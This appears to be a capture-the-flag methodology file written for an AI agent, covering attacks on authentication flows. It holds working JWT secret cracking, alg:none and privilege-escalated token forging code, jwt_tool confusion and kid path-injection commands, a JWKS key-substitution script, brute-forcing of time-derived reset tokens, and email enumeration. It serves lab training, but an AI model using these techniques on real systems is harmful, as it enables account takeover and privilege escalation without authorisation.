# Auth — lifecycle, first-use account claiming, JWT, password reset

## 0. Authentication state census

Before consuming a magic link, activation code, invitation, verification code, or reset token,
map the flow as a state machine:

- **Identity:** email/username, org, role, and whether IT or an invitation pre-provisioned it.
- **Account state:** absent, invited, unclaimed, pending, active, disabled, or recovered.
- **Artifact:** which endpoint issues the token, where it is disclosed, its lifetime, and whether
  requesting or redeeming it changes account state.
- **Consumers:** every endpoint and field that accepts token-shaped input — registration, claim,
  activation, invite, password reset, verification, and login.
- **Session property:** which identity, role/org membership, and authentication assurance the
  resulting session actually carries. A gate such as `step_up_required` is a capability target,
  not merely an error string.

Words such as **first use**, **activate**, **claim**, **pre-provisioned**, **passwordless**, and
**invited** trigger this census. Keep at least one seeded or privileged identity untouched as a
reserve. Normal redemption is destructive evidence: it can activate or consume precisely the
state needed for a cross-flow claim. Test the live artifact against registration/claim/activation
fields first, then redeem it normally only if those probes miss. A negative result obtained after
activation or token consumption clears only that later state, not the original flow.

When you know a pre-provisioned identity and can obtain its auth artifact, run the bounded helper:

```bash
python3 ~/.claude/skills/web-ctf/scripts/authquick.py --base <target> \
  --account 'executive@example.test=Executive Name' --password '<chosen-password>' \
  --register-field 'username=<required-value>' --objective-path /api/protected/action
```

It requests an artifact, checks public dev inbox/mail endpoints, establishes an existing-account
registration baseline, and tests a small token-field set against that flow **before** verification.
On a strong transition it verifies if needed, proves persistent password login, and calls the
optional objective. Add `--register-field key=value` for every required registration field and
repeat `--account` to supply reserve/rotation identities. Evidence goes to `probes.jsonl` and a
mode-0600 `auth-state.json`; exit 0 means a claim transition or flag, 2 means inconclusive or
rate-limited, and 3 means a request/gateway circuit break. Generated auth values are scalar
strings only: the helper never sends SQL/NoSQL operators or type-confusion payloads to auth fields.

## 1. Get an account

With creds, try each login endpoint (JSON and form-encoded):

```bash
for p in /login /api/login /auth /api/auth; do
  echo "=== $p ==="
  curl -si -X POST <target>$p -H 'Content-Type: application/json' \
    -d '{"username":"<user>","password":"<pass>"}'
done
curl -si -X POST <target>/login -d 'username=<user>&password=<pass>'
```

No creds → open registration:

```bash
for p in /register /api/register /api/signup; do
  echo "=== $p ==="
  curl -si -X POST <target>$p -H 'Content-Type: application/json' \
    -d '{"username":"testuser","email":"test@test.com","password":"Test1234!"}'
done
```

### After successful auth

Record the working endpoint, mechanism, and **all** user data returned (id, role, org, permissions).

- Bearer token → `AUTH_HEADER='-H "Authorization: Bearer <token>"'`
- Set-Cookie → `AUTH_HEADER='-b "<name>=<value>"'`
- `YOUR_ID=<id>` from the response (needed for IDOR). If absent, fetch `/api/profile` or `/api/me`.

JWT returned → decode and run the fast-track immediately:
```bash
python3 /opt/security-tools/jwt_tool/jwt_tool.py <token>
```

## 2. JWT fast-track

**Run the whole cheap surface in the foreground the moment you hold a token.** Do not background
it and do not defer it — measured on this box:

| Wordlist | Lines | Full scan, no hit |
|---|---|---|
| `SecLists/Passwords/scraped-JWT-secrets.txt` | 104k | **0.8s** |
| `rockyou.txt` | 14.3M | **38.7s** |

0.8s is cheaper than one HTTP round-trip to the lab, so a background job for the first stage
alone would be pure overhead. `jwtquick.py` chains both lists by default: the 104k JWT-specific
list first — dev placeholders (`secret`, `your-256-bit-secret`, `changeme`; `secret` sits at
line 40 of it) — then rockyou automatically on a miss. **Don't assume a miss on the dev-placeholder
list means the secret is exotic** — plain common words are still a common author choice, and
that's exactly what the second stage is for, not an unlikely-to-pay-off escape hatch.

```bash
python3 ~/.claude/skills/web-ctf/scripts/jwtquick.py --token "$TOKEN" \
  --base <target> --test /api/admin/stats
```

One call does: decode → dictionary-crack (chained, see above) → mint `alg:none` × 4 → mint
privilege-escalated and id-swapped forgeries → fire all of them at a route that currently
refuses you → scan status, headers and body for a flag, and print the winning token. ~1s
typical (first-stage hit or immediate miss-through), ~40s worst case (both lists scanned dry) —
still one blocking call either way, so it stays a foreground reflex rather than something worth
a background job's context-switch overhead. `--wordlist <path>` pins a single list and skips
the chain, for when you already know which one you want.

On Cheesy-007 the secret was the literal string `secret` — caught by the first stage, instantly,
but only after ~15 tool calls had gone into the app's commerce logic first, because the crack
had been filed as a fallback rather than a step-3 reflex. On Necromancer the secret was
`pumpkin` — not a dev placeholder, absent from the 104k list entirely, sitting at candidate 547
of rockyou. Read literally, "if 104k dev secrets miss, the secret is usually random" would have
stopped short of it; chaining to rockyou by default is what this lab argues for.

### Reading the output

Every candidate gets tagged, based on the response's status *and* body content — not length alone,
and not a reworded error message:

- `rejected` — still reaches a denial (401/403, or auth-denial language in the body). A changed
  error message is still `rejected`, never treated as promising.
- `POSSIBLE BYPASS` — the baseline denial is gone. Worth chasing immediately.
- `FLAG` — a flag pattern anywhere in the body or a header, printed with the winning token. This is
  unconditional success regardless of what the status code says.

`jwtquick` prints a `forged:resign-only` candidate as a **control** — same claims, re-signed with
the cracked secret. If that one also succeeds, the win came from re-signing (the server was
rejecting your original token for an unrelated reason), not from privilege escalation. Expect it
to stay `rejected` at the baseline status.

### Forging by hand

`jwt_tool -T` prompts interactively for which claim to edit, which is awkward to drive
non-interactively. Once you have the secret, mint tokens directly:

```python
import hmac, hashlib, base64, json, time
b64 = lambda b: base64.urlsafe_b64encode(b).rstrip(b"=")
def sign(payload, secret="secret"):
    h = b64(json.dumps({"alg":"HS256","typ":"JWT"}, separators=(",",":")).encode())
    p = b64(json.dumps(payload, separators=(",",":")).encode())
    s = b64(hmac.new(secret.encode(), h+b"."+p, hashlib.sha256).digest())
    return (h+b"."+p+b"."+s).decode()
print(sign({"id":1,"username":"admin","role":"admin","iat":int(time.time())}))
```

Keep every claim from the original token and change only the privilege one (`role`, `isAdmin`,
`userId`) — a missing `iat`/`exp`/`sub` the verifier expects will fail for the wrong reason.

### Validate the forgery against the target, never against `/me`

**Test a forged token on the 403 route you actually want.** `/api/verify-token`, `/api/me` and
`/api/profile` commonly re-read the user row from the DB and echo **stored** state, so they
report your real role no matter how good the forgery is. On Cheesy-007 `/api/verify-token`
returned `"role":"user"` for a token that was simultaneously opening every `/api/admin/*` route —
believing it would have killed a live, winning vector.

Corollary: the forged identity usually doesn't need to exist or match. A token minted for an
unrelated user id with `role:"admin"` worked identically; only the authorizing claim mattered.

**If it doesn't crack**, mark JWT-forge as killed in `WORKLOG.md` and move on — do not return
without new information (a leaked secret, a JWKS write primitive). Also verify the verifier
actually rejects unsigned tokens (`alg: none/None/NONE/nOnE` × empty/garbage signature) before
concluding.

## 3. JWT deep-dive (only with a new primitive)

```bash
python3 /opt/security-tools/jwt_tool/jwt_tool.py "$TOKEN" -X k -pk recon/pubkey.pem   # RS256→HS256 confusion
python3 /opt/security-tools/jwt_tool/jwt_tool.py "$TOKEN" -I -hc kid -hv "../../dev/null"  # kid injection
python3 /opt/security-tools/jwt_tool/jwt_tool.py "$TOKEN" -T -S hs256 -p "<secret>"
```

### JWKS substitution (requires upload write-traversal — see traversal-upload.md)

```python
python3 << 'EOF'
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import json, base64, os
os.makedirs('~/Offsec/Web_CTF/CTF/<challenge-name>/exploits', exist_ok=True)
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
pub = private_key.public_key().public_numbers()
def b64u(n):
    l = (n.bit_length() + 7) // 8
    return base64.urlsafe_b64encode(n.to_bytes(l,'big')).rstrip(b'=').decode()
kid = "pwned"
jwks = {"keys":[{"kty":"RSA","use":"sig","alg":"RS256","kid":kid,"n":b64u(pub.n),"e":b64u(pub.e)}]}
open('~/Offsec/Web_CTF/CTF/<challenge-name>/exploits/private_key.pem','wb').write(
    private_key.private_bytes(serialization.Encoding.PEM,
        serialization.PrivateFormat.TraditionalOpenSSL, serialization.NoEncryption()))
json.dump(jwks, open('~/Offsec/Web_CTF/CTF/<challenge-name>/exploits/jwks.json','w'))
print("Done. KID:", kid)
EOF
```

Overwrite the server JWKS, verify, then forge — match the claim name the app's verify function reads (`user_id`/`sub`/`id`/`userId`):

```python
import jwt
from cryptography.hazmat.primitives.serialization import load_pem_private_key
key = load_pem_private_key(open('.../private_key.pem','rb').read(), password=None)
print(jwt.encode({"user_id": "<target-uuid>"}, key, algorithm="RS256",
                 headers={"kid":"pwned","alg":"RS256","typ":"JWT"}))
```

Re-probe every previously-403'd endpoint after each forge attempt.

## 4. Password reset / forgot-password flows

Often the softest path to admin. Map the flow first: `POST /api/forgot-password {email}` → token → `POST /api/reset-password {token,password}`.

**Inspect the token's entropy before attacking anything else.** Request one for your own account, read it, and test whether it's derived from time:

```bash
python3 -c "print(int('<token>',16))"   # compare against the mail timestamp in epoch ms
```

A token equal to `Date.now().toString(16)` has **zero entropy** — it's a hex millisecond. To exploit, you need the generation instant:
- any endpoint that echoes server time (telemetry, logs, debug, `Date` response header)
- the `Date` header alone bounds it to a 1000-candidate window
- request/response latency brackets it further

Then brute the window against `reset-password` (a few hundred candidates, ~16 threads).

**Finding the target's email address.** Prefer an oracle on the **write path** over a side-effect path:
- *Write path (reliable):* registration uniqueness. `POST /api/register` with a throwaway unique username + candidate email → a combined `"Username or email already exists"` proves the **email** exists.
- *Side-effect path (unreliable):* "did a reset email arrive in the dev mailbox?" — routinely filtered for seeded/admin accounts and will give **false negatives**. On Tanuki `admin@tanuki.app` was in the first six guesses, produced no mail, and got wrongly eliminated; the register oracle flagged it instantly.

Never let one negative oracle eliminate a candidate. Confirm with a structurally different second oracle.

Also test on the reset endpoint:
- extra body fields to retarget the account (`username`, `user_id`, `id`, `email`, `target`) — mass assignment
- SQL/NoSQL metacharacters and `%`/`_` LIKE wildcards in the email lookup
- alternate field names on forgot-password (`username`, `login`, `identifier`)
- whether a dev "mailcatcher" page (`/api/email`, `/mail`, `/dev/mail`) is reachable **unauthenticated**
